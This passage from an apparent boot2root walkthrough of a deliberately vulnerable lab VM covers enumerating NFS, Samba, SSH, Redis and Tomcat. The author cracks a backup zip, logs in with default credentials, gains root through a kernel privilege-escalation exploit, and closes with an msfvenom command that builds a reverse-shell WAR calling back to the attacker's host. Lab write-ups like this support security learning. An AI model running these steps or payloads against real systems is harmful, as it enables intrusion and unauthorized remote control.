</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      33719/tcp  mountd
</span><span class='line'>|   100005  1,2,3      41291/udp  mountd
</span><span class='line'>|   100021  1,3,4      47439/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      60285/udp  nlockmgr
</span><span class='line'>|   100024  1          57769/udp  status
</span><span class='line'>|   100024  1          58840/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl
</span><span class='line'>2049/tcp  open  nfs_acl     2-3 (RPC #100227)
</span><span class='line'>47439/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>48137/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>58840/tcp open  status      1 (RPC #100024)
</span><span class='line'>33719/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>43866/tcp open  mountd      1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.217.128
</span><span class='line'>Export list for 192.168.217.128:
</span><span class='line'>/backup *</span></code></pre></td></tr></table></div></figure>


<p>I mounted it on my machine and found an archive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir backup
</span><span class='line'>root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
</span><span class='line'>ls -la
</span><span class='line'>total 12760
</span><span class='line'>drwxr-xr-x 2 root root     4096 Feb 14  2016 .
</span><span class='line'>drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
</span><span class='line'>-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip</span></code></pre></td></tr></table></div></figure>


<p>When I tried unzipping it, I got prompted for a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip backup.tar.bz2.zip 
</span><span class='line'>Archive:  backup.tar.bz2.zip
</span><span class='line'>[backup.tar.bz2.zip] backup.tar.bz2 password:</span></code></pre></td></tr></table></div></figure>


<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip --help
</span><span class='line'>
</span><span class='line'>fcrackzip version 1.0, a fast/free zip password cracker
</span><span class='line'>written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on
</span><span class='line'>http://www.goof.com/pcg/marc/
</span><span class='line'>
</span><span class='line'>USAGE: fcrackzip
</span><span class='line'>          [-b|--brute-force]            use brute force algorithm
</span><span class='line'>          [-D|--dictionary]             use a dictionary
</span><span class='line'>          [-B|--benchmark]              execute a small benchmark
</span><span class='line'>          [-c|--charset characterset]   use characters from charset
</span><span class='line'>          [-h|--help]                   show this message
</span><span class='line'>          [--version]                   show the version of this program
</span><span class='line'>          [-V|--validate]               sanity-check the algortihm
</span><span class='line'>          [-v|--verbose]                be more verbose
</span><span class='line'>          [-p|--init-password string]   use string as initial password/file
</span><span class='line'>          [-l|--length min-max]         check password with length min to max
</span><span class='line'>          [-u|--use-unzip]              use unzip to weed out wrong passwords
</span><span class='line'>          [-m|--method num]             use method number "num" (see below)
</span><span class='line'>          [-2|--modulo r/m]             only calculcate 1/m of the password
</span><span class='line'>          file...                    the zipfiles to crack
</span><span class='line'>
</span><span class='line'>methods compiled in (* = default):
</span><span class='line'>
</span><span class='line'> 0: cpmask
</span><span class='line'> 1: zip1
</span><span class='line'>*2: zip2, USE_MULT_TAB</span></code></pre></td></tr></table></div></figure>


<p>Since the passwords so far have been laughable, I used it in bruteforce mode, but still I was really surprised to get the password instantly:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fcrackzip -b -u -v backup.tar.bz2.zip 
</span><span class='line'>found file 'backup.tar.bz2', (size cp/uc 13057834/13076586, flags 9, chk 28e3)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: pw == aaaaaa</span></code></pre></td></tr></table></div></figure>


<p>From the archive I extracted a html folder filled with what appear to be web applications:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls
</span><span class='line'>dvwa  gentleman  index.html  web-standards  zenphoto</span></code></pre></td></tr></table></div></figure>


<p>I found some passwords inside, but the content was massive. Maybe I will get back to it later, if needed.</p>

<h2>Samba</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: CANYOUPWNME, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>| smb-os-discovery: 
</span><span class='line'>|   OS: Unix (Samba 4.1.6-Ubuntu)
</span><span class='line'>|   Computer name: canyoupwnme
</span><span class='line'>|   NetBIOS computer name: CANYOUPWNME\x00
</span><span class='line'>|   Domain name: 
</span><span class='line'>|   FQDN: canyoupwnme
</span><span class='line'>|_  System time: 2017-12-02T21:15:36+02:00
</span><span class='line'>| smb-security-mode: 
</span><span class='line'>|   account_used: guest
</span><span class='line'>|   authentication_level: user
</span><span class='line'>|   challenge_response: supported
</span><span class='line'>|_  message_signing: disabled (dangerous, but default)
</span><span class='line'>| smb2-security-mode: 
</span><span class='line'>|   2.02: 
</span><span class='line'>|_    Message signing enabled but not required
</span><span class='line'>| smb2-time: 
</span><span class='line'>|   date: 2017-12-02 14:15:37
</span><span class='line'>|_  start_date: 1600-12-31 19:03:58</span></code></pre></td></tr></table></div></figure>


<p>Time to gather some more information with enum4linux. This gave a plethora of info, but to summarize, it found the users: root, admin, user.</p>

<h2>SSH &ndash; privilege escalation</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>1322/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 17:32:b4:85:06:20:b6:90:5b:75:1c:6e:fe:0f:f8:e2 (DSA)
</span><span class='line'>|   2048 53:49:03:32:86:0b:15:b8:a5:f1:2b:8e:75:1b:5a:06 (RSA)
</span><span class='line'>|   256 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a (ECDSA)
</span><span class='line'>|_  256 11:99:87:52:15:c8:ae:96:64:73:d6:49:8c:d7:d7:9f (EdDSA)</span></code></pre></td></tr></table></div></figure>


<p>Here I tried connecting with the credentials I knew, and got in with the admin/admin pair. I searched for a privilege escalation exploit then, and reading /etc/issue was helpful in that regard:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/issue
</span><span class='line'>Ubuntu 14.04.3 LTS \n \l</span></code></pre></td></tr></table></div></figure>


<p>Found the <a href="https://www.exploit-db.com/exploits/39166/">overlayfs applicable exploit</a>, downloaded, compiled and boom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>admin@canyoupwnme:~$ ./overlayfs 
</span><span class='line'>root@canyoupwnme:~# id
</span><span class='line'>uid=0(root) gid=1002(admin) groups=0(root),1002(admin)
</span><span class='line'>root@canyoupwnme:~# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<h2>Redis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>6379/tcp  open  redis       Redis key-value store 3.0.7</span></code></pre></td></tr></table></div></figure>


<p>Redis is something you don&rsquo;t get very often on boot2roots, so this was definitely interesting! First, what is <a href="https://redis.io/topics/introduction">Redis</a>?</p>

<blockquote><p>Redis is an open source (BSD licensed), in-memory data structure store, used as a database, cache and message
broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps,
hyperloglogs and geospatial indexes with radius queries. Redis has built-in replication, Lua scripting, LRU
eviction, transactions and different levels of on-disk persistence, and provides high availability via Redis
Sentinel and automatic partitioning with Redis Cluster</p></blockquote>

<p>The Redis instance can be accessed with the <em>redis-cli</em> tool. I had to install the <em>redis-tools</em> package to get it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>
</span><span class='line'>Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
</span><span class='line'>  -h &lt;hostname&gt;      Server hostname (default: 127.0.0.1).
</span><span class='line'>  -p &lt;port&gt;          Server port (default: 6379).
</span><span class='line'>  -s &lt;socket&gt;        Server socket (overrides hostname and port).
</span><span class='line'>  -a &lt;password&gt;      Password to use when connecting to the server.
</span><span class='line'>  -r &lt;repeat&gt;        Execute specified command N times.
</span><span class='line'>  -i &lt;interval&gt;      When -r is used, waits &lt;interval&gt; seconds per command.
</span><span class='line'>                     It is possible to specify sub-second times like -i 0.1.
</span><span class='line'>  -n &lt;db&gt;            Database number.
</span><span class='line'>  -x                 Read last argument from STDIN.
</span><span class='line'>  -d &lt;delimiter&gt;     Multi-bulk delimiter in for raw formatting (default: \n).
</span><span class='line'>  -c                 Enable cluster mode (follow -ASK and -MOVED redirections).
</span><span class='line'>  --raw              Use raw formatting for replies (default when STDOUT is
</span><span class='line'>                     not a tty).
</span><span class='line'>  --no-raw           Force formatted output even when STDOUT is not a tty.
</span><span class='line'>  --csv              Output in CSV format.
</span><span class='line'>  --stat             Print rolling stats about server: mem, clients, ...
</span><span class='line'>  --latency          Enter a special mode continuously sampling latency.
</span><span class='line'>                     If you use this mode in an interactive session it runs
</span><span class='line'>                     forever displaying real-time stats. Otherwise if --raw or
</span><span class='line'>                     --csv is specified, or if you redirect the output to a non
</span><span class='line'>                     TTY, it samples the latency for 1 second (you can use
</span><span class='line'>                     -i to change the interval), then produces a single output
</span><span class='line'>                     and exits.
</span><span class='line'>  --latency-history  Like --latency but tracking latency changes over time.
</span><span class='line'>                     Default time interval is 15 sec. Change it using -i.
</span><span class='line'>  --latency-dist     Shows latency as a spectrum, requires xterm 256 colors.
</span><span class='line'>                     Default time interval is 1 sec. Change it using -i.
</span><span class='line'>  --lru-test &lt;keys&gt;  Simulate a cache workload with an 80-20 distribution.
</span><span class='line'>  --slave            Simulate a slave showing commands received from the master.
</span><span class='line'>  --rdb &lt;filename&gt;   Transfer an RDB dump from remote server to local file.
</span><span class='line'>  --pipe             Transfer raw Redis protocol from stdin to server.
</span><span class='line'>  --pipe-timeout &lt;n&gt; In --pipe mode, abort with error if after sending all data.
</span><span class='line'>                     no reply is received within &lt;n&gt; seconds.
</span><span class='line'>                     Default timeout: 30. Use 0 to wait forever.
</span><span class='line'>  --bigkeys          Sample Redis keys looking for big keys.
</span><span class='line'>  --scan             List all keys using the SCAN command.
</span><span class='line'>  --pattern &lt;pat&gt;    Useful with --scan to specify a SCAN pattern.
</span><span class='line'>  --intrinsic-latency &lt;sec&gt; Run a test to measure intrinsic system latency.
</span><span class='line'>                     The test will run for the specified amount of seconds.
</span><span class='line'>  --eval &lt;file&gt;      Send an EVAL command using the Lua script at &lt;file&gt;.
</span><span class='line'>  --ldb              Used with --eval enable the Redis Lua debugger.
</span><span class='line'>  --ldb-sync-mode    Like --ldb but uses the synchronous Lua debugger, in
</span><span class='line'>                     this mode the server is blocked and script changes are
</span><span class='line'>                     are not rolled back from the server memory.
</span><span class='line'>  --help             Output this help and exit.
</span><span class='line'>  --version          Output version and exit.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  cat /etc/passwd | redis-cli -x set mypasswd
</span><span class='line'>  redis-cli get mypasswd
</span><span class='line'>  redis-cli -r 100 lpush mylist x
</span><span class='line'>  redis-cli -r 100 -i 1 info | grep used_memory_human:
</span><span class='line'>  redis-cli --eval myscript.lua key1 key2 , arg1 arg2 arg3
</span><span class='line'>  redis-cli --scan --pattern '*:12345*'
</span><span class='line'>
</span><span class='line'>  (Note: when using --eval the comma separates KEYS[] from ARGV[] items)
</span><span class='line'>
</span><span class='line'>When no command is given, redis-cli starts in interactive mode.
</span><span class='line'>Type "help" in interactive mode for information on available commands
</span><span class='line'>and settings.</span></code></pre></td></tr></table></div></figure>


<p>So I pointed the CLI tool to the Redis server and got a lot of information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>redis-cli -h 192.168.217.128
</span><span class='line'>192.168.217.128:6379&gt; help
</span><span class='line'>redis-cli 4.0.2
</span><span class='line'>To get help about Redis commands type:
</span><span class='line'>      "help @&lt;group&gt;" to get a list of commands in &lt;group&gt;
</span><span class='line'>      "help &lt;command&gt;" for help on &lt;command&gt;
</span><span class='line'>      "help &lt;tab&gt;" to get a list of possible help topics
</span><span class='line'>      "quit" to exit
</span><span class='line'>
</span><span class='line'>To set redis-cli preferences:
</span><span class='line'>      ":set hints" enable online hints
</span><span class='line'>      ":set nohints" disable online hints
</span><span class='line'>Set your preferences in ~/.redisclirc
</span><span class='line'>192.168.217.128:6379&gt; info
</span><span class='line'># Server
</span><span class='line'>redis_version:3.0.7
</span><span class='line'>redis_git_sha1:00000000
</span><span class='line'>redis_git_dirty:0
</span><span class='line'>redis_build_id:aa70bcb321ba8313
</span><span class='line'>redis_mode:standalone
</span><span class='line'>os:Linux 3.19.0-25-generic i686
</span><span class='line'>arch_bits:32
</span><span class='line'>multiplexing_api:epoll
</span><span class='line'>gcc_version:4.8.4
</span><span class='line'>process_id:1263
</span><span class='line'>run_id:859e316c5f791eee47cb4e7aabdccfd2c3a124b9
</span><span class='line'>tcp_port:6379
</span><span class='line'>uptime_in_seconds:3235
</span><span class='line'>uptime_in_days:0
</span><span class='line'>hz:10
</span><span class='line'>lru_clock:2368010
</span><span class='line'>config_file:/etc/redis/6379.conf
</span><span class='line'>
</span><span class='line'># Clients
</span><span class='line'>connected_clients:1
</span><span class='line'>client_longest_output_list:0
</span><span class='line'>client_biggest_input_buf:0
</span><span class='line'>blocked_clients:0
</span><span class='line'>
</span><span class='line'># Memory
</span><span class='line'>used_memory:637624
</span><span class='line'>used_memory_human:622.68K
</span><span class='line'>used_memory_rss:8929280
</span><span class='line'>used_memory_peak:637624
</span><span class='line'>used_memory_peak_human:622.68K
</span><span class='line'>used_memory_lua:24576
</span><span class='line'>mem_fragmentation_ratio:14.00
</span><span class='line'>mem_allocator:jemalloc-3.6.0
</span><span class='line'>
</span><span class='line'># Persistence
</span><span class='line'>loading:0
</span><span class='line'>rdb_changes_since_last_save:0
</span><span class='line'>rdb_bgsave_in_progress:0
</span><span class='line'>rdb_last_save_time:1512314215
</span><span class='line'>rdb_last_bgsave_status:ok
</span><span class='line'>rdb_last_bgsave_time_sec:-1
</span><span class='line'>rdb_current_bgsave_time_sec:-1
</span><span class='line'>aof_enabled:0
</span><span class='line'>aof_rewrite_in_progress:0
</span><span class='line'>aof_rewrite_scheduled:0
</span><span class='line'>aof_last_rewrite_time_sec:-1
</span><span class='line'>aof_current_rewrite_time_sec:-1
</span><span class='line'>aof_last_bgrewrite_status:ok
</span><span class='line'>aof_last_write_status:ok
</span><span class='line'>
</span><span class='line'># Stats
</span><span class='line'>total_connections_received:2
</span><span class='line'>total_commands_processed:2
</span><span class='line'>instantaneous_ops_per_sec:0
</span><span class='line'>total_net_input_bytes:41
</span><span class='line'>total_net_output_bytes:6067614
</span><span class='line'>instantaneous_input_kbps:0.00
</span><span class='line'>instantaneous_output_kbps:0.00
</span><span class='line'>rejected_connections:0
</span><span class='line'>sync_full:0
</span><span class='line'>sync_partial_ok:0
</span><span class='line'>sync_partial_err:0
</span><span class='line'>expired_keys:0
</span><span class='line'>evicted_keys:0
</span><span class='line'>keyspace_hits:0
</span><span class='line'>keyspace_misses:0
</span><span class='line'>pubsub_channels:0
</span><span class='line'>pubsub_patterns:0
</span><span class='line'>latest_fork_usec:0
</span><span class='line'>migrate_cached_sockets:0
</span><span class='line'>
</span><span class='line'># Replication
</span><span class='line'>role:master
</span><span class='line'>connected_slaves:0
</span><span class='line'>master_repl_offset:0
</span><span class='line'>repl_backlog_active:0
</span><span class='line'>repl_backlog_size:1048576
</span><span class='line'>repl_backlog_first_byte_offset:0
</span><span class='line'>repl_backlog_histlen:0
</span><span class='line'>
</span><span class='line'># CPU
</span><span class='line'>used_cpu_sys:3.71
</span><span class='line'>used_cpu_user:1.60
</span><span class='line'>used_cpu_sys_children:0.00
</span><span class='line'>used_cpu_user_children:0.00
</span><span class='line'>
</span><span class='line'># Cluster
</span><span class='line'>cluster_enabled:0
</span><span class='line'>
</span><span class='line'># Keyspace
</span><span class='line'>192.168.217.128:6379&gt; </span></code></pre></td></tr></table></div></figure>


<p>It turns out, Redis is by default not that secure, and there are ways to achieve a somewhat arbitrary file upload on hosts running the Redis server. You can find a detailed explanation about it <a href="http://antirez.com/news/96">here</a>. I followed the steps outlined, and I also tried with the Metasploit Redis File Upload module, but it didn&rsquo;t work. Maybe some permissions issue, or Redis not running as root. The attempt was centered around copying an SSH key I generated to the remote authorized_keys file. But even though I didn&rsquo;t manage it, I learned something new about exploiting Redis today.</p>

<h2>Tomcat default credentials</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>


<p>Time to look at that Tomcat server!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h http://192.168.217.128:8080/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.128
</span><span class='line'>+ Target Hostname:    192.168.217.128
</span><span class='line'>+ Target Port:        8080
</span><span class='line'>+ Start Time:         2017-12-03 12:21:45 (GMT-5)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache-Coyote/1.1
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1454530701000 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
</span><span class='line'>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
</span><span class='line'>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
</span><span class='line'>+ /: Appears to be a default Apache Tomcat install.
</span><span class='line'>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
</span><span class='line'>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
</span><span class='line'>+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
</span><span class='line'>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
</span><span class='line'>+ /manager/status: Tomcat Server Status interface found (pass protected)
</span><span class='line'>+ 7661 requests: 0 error(s) and 14 item(s) reported on remote host
</span><span class='line'>+ End Time:           2017-12-03 12:22:12 (GMT-5) (27 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>Nikto found the default credentials of tomcat/tomcat. Used them to log in to the Web Application Manager interface.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/manager-fullpage.png" title="manager" alt="tomcat web application manager"></p>

<p>The interesting part here is that we can upload a WAR file. A Web Application Resource file is a JAR file used to distribute various components that make up a web application. For this particular scenario, I decided to generate a payload with msfvenom, but there is also a Metasploit module that can do the job: <code>msfvenom -a x86 &mdash;platform linux -p java/jsp_shell_reverse_tcp LHOST=192.168.217.132 LPORT=8888 -f war -o runme.war</code></p>

